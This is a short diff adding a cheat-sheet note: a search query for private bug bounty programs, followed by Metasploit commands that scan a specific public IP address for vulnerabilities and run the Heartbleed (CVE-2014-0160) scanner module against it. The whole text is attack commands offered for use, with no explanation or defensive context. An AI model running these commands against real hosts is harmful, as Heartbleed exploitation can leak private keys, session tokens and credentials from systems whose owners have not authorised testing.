@@ -1,0 +1,10 @@
+inurl: private bugbountyprogram
+------------------------------------------------------------------------------
+HeartBleed - SSL Issues | CVE-2014-0160 Exploit Vulnerability with Metasploit:
+# nmap -sV --script=vuln 54.75.182.247
+# msf6 > search heartbleed
+# use auxiliary/scanner/ssl/openssl_heartbleed
+# show info
+# set RHOSTS 54.75.182.247
+# run
+------------------------------------------------------------------------------
